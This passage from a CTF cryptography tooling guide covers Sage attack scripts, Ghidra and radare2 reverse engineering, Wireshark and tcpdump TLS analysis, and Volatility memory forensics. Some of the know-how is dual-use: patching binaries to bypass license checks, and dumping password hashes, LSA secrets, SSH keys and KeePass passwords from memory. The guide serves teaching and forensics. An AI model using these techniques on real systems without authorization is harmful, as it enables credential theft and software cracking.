# Baby-step giant-step algorithm
x = discrete_log_generic(mod(h, p), mod(g, p))

# Pollard's rho for discrete log
x = discrete_log_rho(mod(h, p), mod(g, p))
```

**Chinese Remainder Theorem:**

python

```python
# Solve system of congruences
# x ≡ a1 (mod m1)
# x ≡ a2 (mod m2)
# ...

remainders = [2, 3, 1]
moduli = [3, 4, 5]

x = CRT_list(remainders, moduli)
print(f"Solution: {x}")

# Alternative syntax
x = crt([2, 3, 1], [3, 4, 5])
```

#### CTF-Specific Sage Scripts

**Coppersmith's Attack (Small Exponent):**

python

```python
# Find small roots of polynomial modulo n
def coppersmith_attack(n, e, c, bits):
    P.<x> = PolynomialRing(Zmod(n))
    f = (x + c)^e - c
    
    # Coppersmith method
    roots = f.small_roots(X=2^bits, beta=0.5)
    
    if roots:
        return roots[0]
    return None

# Example usage
n = 123456789...
e = 3
c = 987654321...
bits = 100

m_low = coppersmith_attack(n, e, c, bits)
```

**Franklin-Reiter Related Message Attack:**

python

```python
def franklin_reiter(n, e, c1, c2, r):
    # m2 = m1 + r
    P.<X> = PolynomialRing(Zmod(n))
    f1 = X^e - c1
    f2 = (X + r)^e - c2
    
    # GCD of polynomials
    result = gcd(f1, f2)
    
    if result.degree() == 1:
        return -result.coefficients()[0]
    return None

# Usage
m = franklin_reiter(n, e, c1, c2, known_difference)
```

### ghidra

Ghidra is an NSA-developed open-source reverse engineering framework, essential for analyzing compiled cryptographic implementations and finding implementation flaws.

#### Installation

**Kali Linux:**

bash

```bash
# Install from repositories
sudo apt update
sudo apt install ghidra

# Launch Ghidra
ghidra

# Or use specific path
/usr/share/ghidra/ghidraRun
```

**Manual Installation:**

bash

```bash
# Download from GitHub releases
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.4_build/ghidra_10.4_PUBLIC_20230928.zip

# Extract
unzip ghidra_10.4_PUBLIC_20230928.zip
cd ghidra_10.4_PUBLIC

# Install JDK (required)
sudo apt install openjdk-17-jdk

# Run Ghidra
./ghidraRun
```

**First-Time Setup:**

bash

```bash
# Create new project
# File → New Project → Non-Shared Project
# Select project directory and name

# Import binary
# File → Import File
# Select target binary
# Auto-analyze when prompted
```

#### Key Features for Crypto Analysis

**Decompiler Usage:**

```
1. Load binary into Ghidra
2. Run auto-analysis (Analysis → Auto Analyze)
3. Navigate to function in Symbol Tree
4. View decompiled C code in Decompile window
5. Cross-reference assembly (Listing window)

# Keyboard shortcuts
G - Go to address/function
L - Set label
; - Add comment
Ctrl+Shift+E - Edit function signature
```

**Identifying Crypto Functions:**

```
# Search for crypto constants
Search → For Scalars
Common values:
- AES S-box: 0x63, 0x7C, 0x77, 0x7B...
- MD5: 0x67452301, 0xEFCDAB89
- SHA-1: 0x67452301, 0xEFCDAB89, 0x98BADCFE
- SHA-256: 0x6A09E667, 0xBB67AE85

# String search for library names
Search → For Strings
Filter: "crypto", "ssl", "aes", "rsa", "sha"

# Find XOR operations (common in crypto)
Search → Instruction Patterns
Pattern: XOR
```

**Function Analysis:**

```
# Analyze encryption routine
1. Identify function entry point
2. Track key/IV parameters
3. Identify rounds/iterations
4. Look for weak constants
5. Check for implementation errors

# Example: Finding AES key schedule
# Look for function with:
# - 10/12/14 rounds (AES-128/192/256)
# - Rcon constants
# - Shift/substitute operations

# Script to find constants
Window → Script Manager
Run: FindCryptoConstants.java
```

**Data Flow Analysis:**

```
# Track sensitive data
1. Right-click variable → References → Show References to
2. Follow data through function calls
3. Identify where keys are stored
4. Check for hardcoded secrets

# Example: Trace key variable
# Select key parameter
# Right-click → Highlight → Forward Slicing
```

**Patching Binaries:**

```
# Patch instructions
1. Navigate to instruction
2. Right-click → Patch Instruction
3. Modify assembly
4. Export patched binary: File → Export Program

# NOP out checks
# Replace instruction with 0x90 (NOP)
# Common for bypassing license checks or validation

# Change conditional jumps
JNE → JE (0x75 → 0x74)
JE → JNE (0x74 → 0x75)
```

#### Ghidra Scripts for Crypto

**Python Script - Find XOR Keys:**

python

```python
# Find XOR operations with constants
# Ghidra Script: find_xor_keys.py

from ghidra.program.model.block import BasicBlockModel
from ghidra.program.model.pcode import PcodeOp

def find_xor_operations():
    program = getCurrentProgram()
    listing = program.getListing()
    
    func_iter = listing.getFunctions(True)
    
    for func in func_iter:
        inst_iter = listing.getInstructions(func.getBody(), True)
        
        for inst in inst_iter:
            if inst.getMnemonicString() == "XOR":
                operands = inst.getDefaultOperandRepresentationList(1)
                if operands and operands[0].startswith("0x"):
                    print(f"XOR with constant at {inst.getAddress()}: {operands[0]}")

find_xor_operations()
```

**Identify Base64 Tables:**

python

```python
# Find Base64 encoding tables
# Common pattern: "ABCDEFGHIJKLMNOPQRSTUVWXYZ..."

from ghidra.program.model.mem import MemoryAccessException

def find_base64_table():
    program = getCurrentProgram()
    memory = program.getMemory()
    
    base64_std = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    search_bytes = base64_std[:20].encode()  # Search first 20 chars
    
    address = memory.findBytes(memory.getMinAddress(), search_bytes, None, True, monitor)
    
    if address:
        print(f"Potential Base64 table at: {address}")
        data = memory.getBytes(address, 64)
        print(f"Table: {data.decode('latin-1')}")

find_base64_table()
```

### radare2

Radare2 is a powerful command-line reverse engineering framework with extensive analysis capabilities, offering detailed control for crypto binary analysis.

#### Installation

**Kali Linux:**

bash

```bash
# Install from repositories
sudo apt update
sudo apt install radare2

# Verify installation
r2 -v

# Install additional tools
sudo apt install radare2-cutter  # GUI frontend
```

**Git Installation (Latest Version):**

bash

```bash
# Clone and build
git clone https://github.com/radareorg/radare2
cd radare2
sys/install.sh

# Update radare2
sys/install.sh

# Uninstall
make uninstall
```

#### Basic Commands

**Opening and Analyzing Files:**

bash

```bash
# Open binary in write mode
r2 -w binary

# Open in debug mode
r2 -d binary

# Auto-analysis
r2 -A binary

# Open with specific architecture
r2 -a x86 -b 64 binary
```

**Navigation:**

bash

```bash
# Inside r2
aaa          # Analyze all (functions, references)
afl          # List functions
pdf @ main   # Print disassembly of main function
s main       # Seek to main function
s 0x400000   # Seek to specific address

# Visual mode
V            # Enter visual mode
VV           # Visual graph mode
p            # Cycle print modes
q            # Quit visual mode
```

**Searching:**

bash

```bash
# Search for strings
iz           # List strings in data sections
izz          # List all strings
/ keyword    # Search for keyword

# Search for hex bytes
/x 6a0f05    # Search for syscall pattern

# Search for crypto constants
/x 6745230198badcfe  # SHA-1 constants
/x 67e6096a85ae67bb  # SHA-256 constants

# Search for XOR operations
/R xor       # Search for XOR instructions
```

#### Crypto-Specific Analysis

**Identify Crypto Functions:**

bash

```bash
# Analyze binary
r2 -A crypto_binary

# List functions with crypto-related names
afl | grep -i crypt
afl | grep -i aes
afl | grep -i rsa
afl | grep -i sha

# Analyze imports
ii | grep -i crypto

# Find cross-references to crypto functions
axt @ sym.imp.EVP_EncryptInit  # OpenSSL example
```

**Disassemble and Decompile:**

bash

```bash
# Disassemble function
pdf @ sym.encrypt_function

# Decompile with r2ghidra plugin
pdg @ sym.encrypt_function

# Show function arguments
afa          # Analyze function arguments
afv          # List variables in function
```

**Data Inspection:**

bash

```bash
# Print hex dump
px 64 @ 0x601000

# Print as string
ps @ 0x601000

# Print bytes
p8 32 @ 0x601000

# Visual hex editor
V!

# Compare memory regions
c 0x400000 0x500000
```

**Dynamic Analysis:**

bash

```bash
# Start debugging
r2 -d binary

# Set breakpoint
db 0x400550
db sym.encrypt_function

# Continue execution
dc

# Step instruction
ds

# Step over
dso

# Print registers
dr           # All registers
dr rax       # Specific register

# Examine stack
pxw 64 @ rsp

# Dump memory region
dm           # List memory maps
dmh          # Heap information
```

#### Radare2 Scripts (r2pipe)

**Python Integration:**

bash

```bash
# Install r2pipe
pip3 install r2pipe
```

**Python Script - Extract Crypto Constants:**

python

```python
#!/usr/bin/env python3
import r2pipe

# Open binary
r2 = r2pipe.open("crypto_binary")

# Analyze
r2.cmd("aaa")

# Find SHA-256 constants
sha256_constants = [
    "6a09e667", "bb67ae85", "3c6ef372", "a54ff53a",
    "510e527f", "9b05688c", "1f83d9ab", "5be0cd19"
]

print("[*] Searching for SHA-256 constants...")
for const in sha256_constants:
    results = r2.cmd(f"/x {const}")
    if results:
        print(f"Found {const}:\n{results}")

# List all functions
functions = r2.cmdj("aflj")  # JSON output
for func in functions:
    if "crypt" in func.get("name", "").lower():
        print(f"[+] Crypto function: {func['name']} at {hex(func['offset'])}")

r2.quit()
```

**Extract XOR Keys:**

python

```python
import r2pipe
import re

r2 = r2pipe.open("binary")
r2.cmd("aaa")

# Find XOR instructions
xor_instructions = r2.cmd("/R xor")

# Parse for constants
for line in xor_instructions.split('\n'):
    match = re.search(r'xor.*0x([0-9a-f]+)', line)
    if match:
        const = match.group(1)
        print(f"XOR key candidate: 0x{const}")

r2.quit()
```

#### r2frida (Dynamic Instrumentation)

**Installation:**

bash

```bash
# Install frida tools
pip3 install frida-tools

# Install r2frida
r2pm -ci r2frida
```

**Usage:**

bash

```bash
# Attach to running process
r2 frida://process_name

# Attach with spawn
r2 frida://spawn/binary

# Hook functions
:. hook_crypto.js

# Intercept crypto calls
\dt      # List threads
\df      # List functions
\db 0x.. # Set breakpoint
```

### wireshark

Wireshark is a network protocol analyzer providing deep inspection of network traffic, crucial for analyzing encrypted communications and identifying crypto vulnerabilities in network protocols.

#### Installation

**Kali Linux:**

bash

```bash
# Already pre-installed on Kali
wireshark

# Install if missing
sudo apt update
sudo apt install wireshark

# Add user to wireshark group (capture without sudo)
sudo usermod -aG wireshark $USER
newgrp wireshark

# Configure dumpcap permissions
sudo dpkg-reconfigure wireshark-common  # Select 'Yes'
```

**TShark (CLI Version):**

bash

```bash
# Command-line packet analysis
tshark -i eth0

# Capture to file
tshark -i eth0 -w capture.pcap

# Read from file
tshark -r capture.pcap
```

#### Crypto Traffic Analysis

**SSL/TLS Decryption:**

bash

```bash
# Method 1: Using server private key
# Edit → Preferences → Protocols → TLS
# RSA keys list: Add server IP, port, protocol, and key file

# Example format:
# 192.168.1.100,443,http,/path/to/server.key

# Method 2: Using SSLKEYLOGFILE (Firefox/Chrome)
# Set environment variable before launching browser:
export SSLKEYLOGFILE=/tmp/sslkeys.log
firefox

# In Wireshark:
# Preferences → Protocols → TLS
# (Pre)-Master-Secret log filename: /tmp/sslkeys.log
```

**Display Filters for Crypto:**

bash

```bash
# SSL/TLS handshake
ssl.handshake || tls.handshake

# TLS Client Hello
tls.handshake.type == 1

# TLS Server Hello
tls.handshake.type == 2

# Certificate messages
tls.handshake.type == 11

# Cipher suites offered
tls.handshake.ciphersuite

# Specific cipher (3DES example)
tls.handshake.ciphersuite == 0x000a

# Show decrypted HTTP
http && tls

# SSH traffic
ssh

# IPSec
esp || ah || isakmp
```

**Protocol-Specific Analysis:**

bash

```bash
# Export SSL/TLS session keys
# Statistics → TLS → Export Session Keys

# Analyze cipher negotiation
tls.handshake.ciphersuite

# Check for weak ciphers
tls.handshake.ciphersuite == 0x0005  # RSA_WITH_RC4_128_SHA
tls.handshake.ciphersuite == 0x000a  # RSA_WITH_3DES_EDE_CBC_SHA

# Certificate extraction
# Right-click on Certificate → Export Packet Bytes

# Identify TLS versions
tls.record.version == 0x0300  # SSL 3.0
tls.record.version == 0x0301  # TLS 1.0
tls.record.version == 0x0302  # TLS 1.1
tls.record.version == 0x0303  # TLS 1.2
tls.record.version == 0x0304  # TLS 1.3
```

#### Command-Line Analysis

**TShark Crypto Filtering:**

bash

```bash
# Extract SSL/TLS handshakes
tshark -r capture.pcap -Y "ssl.handshake" -T fields -e ssl.handshake.ciphersuite

# List cipher suites
tshark -r capture.pcap -Y "tls.handshake.type == 1" -T fields -e tls.handshake.ciphersuite | sort -u

# Extract certificates
tshark -r capture.pcap -Y "ssl.handshake.certificate" -T fields -e ssl.handshake.certificate > cert.der

# Decrypt with key log
tshark -r capture.pcap -o tls.keylog_file:/tmp/sslkeys.log -Y "http" -T fields -e http.request.uri

# Export decrypted traffic
tshark -r capture.pcap -o tls.keylog_file:/tmp/sslkeys.log --export-objects http,/tmp/http_objects/
```

**Statistics and Analysis:**

bash

```bash
# Protocol hierarchy
tshark -r capture.pcap -qz io,phs

# Conversations
tshark -r capture.pcap -qz conv,tcp

# Endpoints
tshark -r capture.pcap -qz endpoints,tcp

# TLS version distribution
tshark -r capture.pcap -Y "tls" -T fields -e tls.record.version | sort | uniq -c
```

#### Wireshark Lua Scripts

**Custom Crypto Dissector:**

```lua
-- Save as crypto_protocol.lua in Wireshark plugins directory
-- ~/.local/lib/wireshark/plugins/ or /usr/lib/x86_64-linux-gnu/wireshark/plugins/

crypto_proto = Proto("CustomCrypto", "Custom Crypto Protocol")

local f_magic = ProtoField.uint32("crypto.magic", "Magic", base.HEX)
local f_cipher = ProtoField.uint8("crypto.cipher", "Cipher Type", base.HEX)
local f_keylen = ProtoField.uint16("crypto.keylen", "Key Length", base.DEC)
local f_data = ProtoField.bytes("crypto.data", "Encrypted Data")

crypto_proto.fields = {f_magic, f_cipher, f_keylen, f_data}

function crypto_proto.dissector(buffer, pinfo, tree) length = buffer:len() if length == 0 then return end

pinfo.cols.protocol = crypto_proto.name

local subtree = tree:add(crypto_proto, buffer(), "Custom Crypto Protocol Data")

subtree:add(f_magic, buffer(0,4))
subtree:add(f_cipher, buffer(4,1))
subtree:add(f_keylen, buffer(5,2))
subtree:add(f_data, buffer(7, length-7))

end

local tcp_port = DissectorTable.get("tcp.port") tcp_port:add(9999, crypto_proto) -- Register on port 9999
```

**XOR Key Detection:**
```lua
-- xor_detector.lua
-- Detect XOR encrypted traffic patterns

function detect_xor(tvb, pinfo, tree)
    local length = tvb:len()
    if length < 10 then return end
    
    local subtree = tree:add("XOR Analysis")
    
    -- Check for repeated byte patterns (weak XOR)
    local bytes = {}
    for i = 0, math.min(length-1, 100) do
        bytes[i+1] = tvb(i,1):uint()
    end
    
    -- Calculate entropy (low entropy might indicate XOR)
    local counts = {}
    for _, byte in ipairs(bytes) do
        counts[byte] = (counts[byte] or 0) + 1
    end
    
    local entropy = 0
    for _, count in pairs(counts) do
        local p = count / #bytes
        entropy = entropy - (p * math.log(p) / math.log(2))
    end
    
    subtree:add("Entropy: " .. string.format("%.2f", entropy))
    
    if entropy < 4.0 then
        subtree:add("WARNING: Low entropy detected - possible XOR encryption")
    end
end

-- Register as postdissector
register_postdissector(detect_xor)
```

#### Advanced Features

**SSL/TLS Stream Export:**
```bash
# GUI Method:
# File → Export Objects → HTTP
# (After decrypting with key log)

# Export specific stream
# Right-click packet → Follow → TLS Stream
# Save As → Raw

# Command-line export
tshark -r capture.pcap -qz follow,tls,raw,0 > stream0.bin
```

**Packet Manipulation:**
```bash
# Edit packets (requires editcap)
editcap capture.pcap modified.pcap

# Remove packets
editcap -r capture.pcap output.pcap 1-100,200-300

# Change timestamps
editcap -t 3600 capture.pcap output.pcap  # Add 1 hour

# Split large captures
editcap -c 1000 large.pcap split.pcap  # 1000 packets per file
```

### tcpdump

tcpdump is a command-line packet analyzer providing lightweight network traffic capture and filtering, essential for quick crypto traffic analysis.

#### Installation

**Kali Linux:**
```bash
# Pre-installed on Kali
tcpdump --version

# Install if missing
sudo apt install tcpdump

# Verify network interfaces
tcpdump -D
ip link show
```

#### Basic Capture Commands

**Interface Capture:**
```bash
# Capture on specific interface
sudo tcpdump -i eth0

# Capture on all interfaces
sudo tcpdump -i any

# Capture without name resolution (faster)
sudo tcpdump -n -i eth0

# Capture with verbose output
sudo tcpdump -v -i eth0
sudo tcpdump -vv -i eth0  # More verbose
sudo tcpdump -vvv -i eth0  # Maximum verbosity
```

**Output Control:**
```bash
# Write to file
sudo tcpdump -i eth0 -w capture.pcap

# Rotate capture files (100MB each)
sudo tcpdump -i eth0 -w capture.pcap -C 100

# Limit packet count
sudo tcpdump -i eth0 -c 1000 -w capture.pcap

# Print packet contents in hex and ASCII
sudo tcpdump -i eth0 -X

# Print in hex only
sudo tcpdump -i eth0 -xx

# Timestamp format
sudo tcpdump -i eth0 -tttt  # Human-readable
```

#### Crypto Traffic Filters

**SSL/TLS Capture:**
```bash
# Capture HTTPS traffic (port 443)
sudo tcpdump -i eth0 port 443 -w https.pcap

# Capture SSL/TLS handshake
sudo tcpdump -i eth0 'tcp port 443 and (tcp[((tcp[12:1] & 0xf0) >> 2):1] = 0x16)'

# Multiple SSL/TLS ports
sudo tcpdump -i eth0 'port 443 or port 8443' -w ssl_traffic.pcap

# Capture TLS Client Hello
sudo tcpdump -i eth0 'tcp dst port 443 and tcp[((tcp[12:1] & 0xf0) >> 2):1] = 0x16 and tcp[((tcp[12:1] & 0xf0) >> 2) + 5:1] = 0x01'
```

**SSH Traffic:**
```bash
# Capture SSH connections
sudo tcpdump -i eth0 port 22 -w ssh.pcap

# SSH traffic to specific host
sudo tcpdump -i eth0 'dst host 192.168.1.100 and port 22'

# Detect SSH handshake
sudo tcpdump -i eth0 'tcp port 22 and tcp[13] = 0x02'  # SYN flag
```

**IPSec Traffic:**
```bash
# Capture ESP (Encapsulating Security Payload)
sudo tcpdump -i eth0 esp -w ipsec_esp.pcap

# Capture AH (Authentication Header)
sudo tcpdump -i eth0 ah -w ipsec_ah.pcap

# Capture IKE (Internet Key Exchange)
sudo tcpdump -i eth0 'udp port 500 or udp port 4500' -w ike.pcap

# All IPSec related traffic
sudo tcpdump -i eth0 '(esp or ah or (udp port 500) or (udp port 4500))' -w ipsec_all.pcap
```

**VPN Traffic:**
```bash
# OpenVPN (UDP)
sudo tcpdump -i eth0 'udp port 1194' -w openvpn.pcap

# OpenVPN (TCP)
sudo tcpdump -i eth0 'tcp port 1194' -w openvpn_tcp.pcap

# WireGuard
sudo tcpdump -i eth0 'udp port 51820' -w wireguard.pcap

# L2TP
sudo tcpdump -i eth0 'udp port 1701' -w l2tp.pcap
```

#### Advanced Filtering

**Complex Crypto Filters:**
```bash
# Capture only handshakes (SYN, SYN-ACK, ACK)
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0' -w handshakes.pcap

# Capture TLS version negotiation
# TLS 1.0: 0x0301, TLS 1.1: 0x0302, TLS 1.2: 0x0303, TLS 1.3: 0x0304
sudo tcpdump -i eth0 'tcp port 443 and tcp[20] = 0x03' -w tls_versions.pcap

# Capture only large packets (possible crypto payloads)
sudo tcpdump -i eth0 'greater 1000' -w large_packets.pcap

# Exclude noise, focus on crypto ports
sudo tcpdump -i eth0 'port 443 or port 22 or port 3389' -w crypto_ports.pcap

# Capture to/from specific crypto server
sudo tcpdump -i eth0 'host crypto.target.com and (port 443 or port 22)' -w target.pcap
```

**BPF (Berkeley Packet Filter) Syntax:**
```bash
# Combine filters with logical operators
sudo tcpdump -i eth0 'tcp and port 443 and host 192.168.1.100'

# OR conditions
sudo tcpdump -i eth0 'port 443 or port 8443'

# NOT conditions
sudo tcpdump -i eth0 'not port 22'

# Complex combinations
sudo tcpdump -i eth0 '(tcp port 443 or tcp port 8443) and host 192.168.1.0/24'

# Protocol-specific
sudo tcpdump -i eth0 'tcp and not port 22 and not port 80'
```

#### CTF-Specific Usage

**Capture Challenge Traffic:**
```bash
# Monitor all traffic during CTF challenge
sudo tcpdump -i eth0 -w ctf_$(date +%Y%m%d_%H%M%S).pcap

# Capture while running exploit
sudo tcpdump -i eth0 -w exploit_traffic.pcap &
TCPDUMP_PID=$!
./exploit.py
sudo kill $TCPDUMP_PID

# Capture DNS queries (potential data exfiltration)
sudo tcpdump -i eth0 'udp port 53' -w dns.pcap
```

**Real-Time Analysis:**
```bash
# Display TLS handshakes in real-time
sudo tcpdump -i eth0 -A 'tcp port 443'

# Show only data packets (PSH flag)
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-push != 0'

# Monitor for specific hex pattern
sudo tcpdump -i eth0 -X | grep -A 10 "pattern"

# Count packets per host
sudo tcpdump -i eth0 -n | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -n
```

**Reading and Post-Processing:**
```bash
# Read captured file
tcpdump -r capture.pcap

# Filter after capture
tcpdump -r capture.pcap 'port 443'

# Extract specific stream
tcpdump -r capture.pcap -w filtered.pcap 'host 192.168.1.100'

# Convert timestamps
tcpdump -r capture.pcap -tttt

# Print packet details
tcpdump -r capture.pcap -vvv -X

# Export to text for grep
tcpdump -r capture.pcap -A > traffic.txt
grep "pattern" traffic.txt
```

#### Integration with Other Tools

**Pipe to Wireshark:**
```bash
# Real-time viewing in Wireshark
sudo tcpdump -i eth0 -w - | wireshark -k -i -

# Capture and analyze simultaneously
sudo tcpdump -i eth0 -U -w - | tee capture.pcap | wireshark -k -i -
```

**Extract Data for Analysis:**
```bash
# Extract SSL/TLS certificates
tcpdump -r capture.pcap -x 'tcp port 443' | grep -A 50 "Certificate"

# Export hex dump for crypto analysis
tcpdump -r capture.pcap -xx 'port 443' > hex_dump.txt

# Extract payload data
tcpdump -r capture.pcap -A 'tcp port 443' | sed -n '/Server Hello/,/Certificate/p' > server_hello.txt
```

### volatility

Volatility is an advanced memory forensics framework for analyzing RAM dumps, critical for extracting cryptographic keys and secrets from memory.

#### Installation

**Kali Linux (Volatility 2):**
```bash
# Install Volatility 2
sudo apt update
sudo apt install volatility

# Verify installation
volatility --info

# Common profile location
ls /usr/lib/python2.7/dist-packages/volatility/plugins/overlays/linux/
```

**Volatility 3 Installation:**
```bash
# Install via pip
pip3 install volatility3

# Or from GitHub
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
pip3 install -r requirements.txt
python3 setup.py install

# Verify
vol -h
```

**Symbol Tables:**
```bash
# Download symbol tables (Volatility 3)
# For Linux analysis
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3/volatility3/framework/symbols/linux

# For Windows analysis
# Symbols are bundled with Volatility 3
```

#### Basic Memory Analysis

**Image Information:**
```bash
# Volatility 2
volatility -f memory.dump imageinfo

# Suggested profiles will be displayed
# Use most appropriate profile for further analysis

# Volatility 3 (auto-detects OS)
vol -f memory.dump windows.info
vol -f memory.dump linux.info
```

**Process Listing:**
```bash
# Volatility 2
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 pstree
volatility -f memory.dump --profile=Win7SP1x64 psscan  # Find hidden processes

# Volatility 3
vol -f memory.dump windows.pslist
vol -f memory.dump windows.pstree
```

#### Crypto-Specific Analysis

**Extract Encryption Keys:**
```bash
# TrueCrypt/VeraCrypt keys (Volatility 2)
volatility -f memory.dump --profile=Win7SP1x64 truecryptmaster
volatility -f memory.dump --profile=Win7SP1x64 truecryptpassphrase

# Extract from specific process
volatility -f memory.dump --profile=Win7SP1x64 truecryptsummary

# Volatility 3
vol -f memory.dump windows.truecrypt.Passphrase
```

**SSH Keys and Passwords:**
```bash
# Volatility 2
# Dump process memory containing ssh/sshd
volatility -f memory.dump --profile=LinuxUbuntu1604x64 linux_bash
volatility -f memory.dump --profile=LinuxUbuntu1604x64 linux_psaux | grep ssh

# Dump specific process
volatility -f memory.dump --profile=LinuxUbuntu1604x64 linux_dump_map -p <PID> -D output/

# Search for SSH keys in dumps
grep -r "BEGIN RSA PRIVATE KEY" output/
grep -r "BEGIN OPENSSH PRIVATE KEY" output/
```

**Browser Crypto Data:**
```bash
# Volatility 2 - Extract browser history (may contain keys/passwords)
volatility -f memory.dump --profile=Win7SP1x64 iehistory
volatility -f memory.dump --profile=Win7SP1x64 chromehistory

# Dump browser process memory
volatility -f memory.dump --profile=Win7SP1x64 memdump -p <CHROME_PID> -D output/

# Search for crypto patterns
strings output/*.dmp | grep -i "password"
strings output/*.dmp | grep -i "key"
strings output/*.dmp | grep -E "-----BEGIN.*KEY-----"
```

**SSL/TLS Session Keys:**
```bash
# Dump Firefox process memory
volatility -f memory.dump --profile=Win7SP1x64 pslist | grep firefox
volatility -f memory.dump --profile=Win7SP1x64 memdump -p <FIREFOX_PID> -D output/

# Search for SSL master keys
strings output/*.dmp | grep "CLIENT_RANDOM"

# Extract SSL session keys for Wireshark decryption
strings output/*.dmp | grep -A 1 "CLIENT_RANDOM" > sslkeys.log
```

**Certificate Extraction:**
```bash
# Volatility 2 - Dump relevant process memory
volatility -f memory.dump --profile=Win7SP1x64 filescan | grep -i cert
volatility -f memory.dump --profile=Win7SP1x64 dumpfiles -Q <OFFSET> -D output/

# Search for X.509 certificates
strings output/* | grep "BEGIN CERTIFICATE"

# Extract certificate data
volatility -f memory.dump --profile=Win7SP1x64 memdump -p <PID> -D certs/
binwalk -e certs/*.dmp --dd='.*'
```

#### Registry and Credential Analysis

**Windows Credentials:**
```bash
# Volatility 2 - LSA secrets
volatility -f memory.dump --profile=Win7SP1x64 lsadump

# Cached domain credentials
volatility -f memory.dump --profile=Win7SP1x64 cachedump

# SAM hashes
volatility -f memory.dump --profile=Win7SP1x64 hashdump

# Volatility 3
vol -f memory.dump windows.hashdump
vol -f memory.dump windows.lsadump
vol -f memory.dump windows.cachedump
```

**Registry Keys:**
```bash
# Volatility 2 - List registry hives
volatility -f memory.dump --profile=Win7SP1x64 hivelist

# Dump specific registry hive
volatility -f memory.dump --profile=Win7SP1x64 printkey -o <OFFSET> -K "Microsoft\Windows\CurrentVersion"

# Search for encryption-related keys
volatility -f memory.dump --profile=Win7SP1x64 printkey -K "Software\Microsoft\SystemCertificates"
```

**Password Managers:**
```bash
# Dump KeePass process
volatility -f memory.dump --profile=Win7SP1x64 pslist | grep -i keepass
volatility -f memory.dump --profile=Win7SP1x64 memdump -p <KEEPASS_PID> -D keepass/

# Search for master password in memory
strings keepass/*.dmp | grep -i "password"

# Extract database from memory
binwalk keepass/*.dmp | grep -i "keepass"
```

#### String Searching and Pattern Matching

**Crypto Pattern Search:**
```bash
# Volatility 2 - String search
volatility -f memory.dump --profile=Win7SP1x64 yarascan -Y "BEGIN RSA PRIVATE KEY"

# Volatility 3
vol -f memory.dump windows.strings | grep -i "password"
vol -f memory.dump windows.strings | grep -E "^[A-Za-z0-9+/]{40,}={0,2}$"  # Base64

# Custom YARA rules for crypto artifacts
cat > crypto_keys.yar << 'EOF'
rule RSA_Private_Key {
    strings:
        $rsa = "-----BEGIN RSA PRIVATE KEY-----"
    condition:
        $rsa
}

rule AES_Key_Schedule {
    strings:
        $key = { 63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76 }
    condition:
        $key
}
EOF

volatility -f memory.dump --profile=Win7SP1x64 yarascan -y crypto_keys.yar
```

**Bulk String Extraction:**
```bash
# Volatility 2 - Extract all strings
volatility -f memory.dump --profile=Win7SP1x64 strings -s strings.txt

# Process strings with crypto focus
cat strings.txt | grep -E "(password|key|secret|token)" > crypto_strings.txt
cat strings.txt | grep -E "^[A-Za-z0-9+/]{32,}={0,2}$" > potential_base64.txt
cat strings.txt | grep -E "-----BEGIN.*-----" > pem_keys.txt
```

#### Network Connection Analysis

**Active Connections:**
```bash
# Volatility 2
volatility -f memory.dump --profile=Win7SP1x64 netscan
volatility -f memory.dump --profile=Win7SP1x64 connections  # XP/2003
volatility -f memory.dump --profile=Win7SP1x64 connscan

# Volatility 3
vol -f memory.dump windows.netscan

# Filter for crypto ports
vol -f memory.dump windows.netscan | grep -E "(443|22|3389)"
```

**Network Packet Reconstruction:**
```bash
# Volatility 2 - Extract network packets from memory
volatility -f memory.dump --profile=Win7SP1x64 netscan
# Note PID of interesting connections

# Dump process memory containing network buffers
volatility -f memory.dump --profile=Win7SP1x64 memdump -p <PID> -D network/

# Use tcpflow to extract streams
tcpflow -r network/*.dmp -o streams/
```

#### CTF-Specific Techniques

**Quick Crypto Triage:**
```bash
# Automated script for crypto artifact extraction
#!/bin/bash

DUMP=$1
PROFILE=$2

echo "[*] Starting crypto triage..."

# Hash dump
echo "[+] Extracting password hashes..."
volatility -f $DUMP --profile=$PROFILE hashdump > hashes.txt

# LSA secrets
echo "[+] Extracting LSA secrets..."
volatility -f $DUMP --profile=$PROFILE lsadump > lsa.txt

# Process list
echo "[+] Analyzing processes..."
volatility -f $DUMP --profile=$PROFILE pslist > processes.txt

# Search for crypto processes
grep -i "crypt\|ssl\|gpg\|keepass\|truecrypt" processes.txt

# String extraction
echo "[+] Extracting crypto strings..."
volatility -f $DUMP --profile=$PROFILE strings -s strings.txt
grep -E "(BEGIN.*KEY|password|secret)" strings.txt > crypto_findings.txt

echo "[*] Triage complete. Check crypto_findings.txt"
```

**Memory Dump from Running System:**
```bash
# Linux - Using LiME (Linux Memory Extractor)
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src
make
sudo insmod lime-*.ko "path=/tmp/memory.lime format=lime"

# Windows - Using WinPmem
wget https://github.com/Velocidex/WinPmem/releases/download/v4.0.rc1/winpmem_mini_x64_rc2.exe
winpmem_mini_x64_rc2.exe memory.raw

# macOS - Using OSXPmem
# Requires disabling SIP
wget https://github.com/google/rekall/releases/download/v1.5.1/osxpmem-2.1.post4.zip
sudo osxpmem.app/osxpmem -o memory.aff4
```

### Important Related Topics

For comprehensive CTF cryptography preparation, consider these essential related areas:

- **Binary Analysis Techniques** - IDA Pro patterns, Ghidra scripting, automatic crypto function identification
- **Side-Channel Analysis** - Power analysis, timing attacks, cache timing for key extraction
- **Firmware Analysis** - Extracting crypto keys from embedded systems and IoT devices
- **Malware Cryptography** - Ransomware key extraction, encrypted C2 communications analysis
- **Cloud Crypto Forensics** - AWS KMS, Azure Key Vault, encrypted storage analysis

---

## (Kali) Custom Script Development

### Bash Scripting for Automation

Bash scripts automate repetitive cryptanalysis tasks, orchestrate complex tool chains, and process bulk cryptographic operations efficiently in CTF scenarios.

**Environment Setup:**

```bash
#!/bin/bash
# crypto_env_setup.sh - Initialize crypto analysis environment

# Ensure required tools are installed
check_tools() {
    local tools=("openssl" "john" "hashcat" "gpg" "xxd" "base64" "nc" "curl")
    
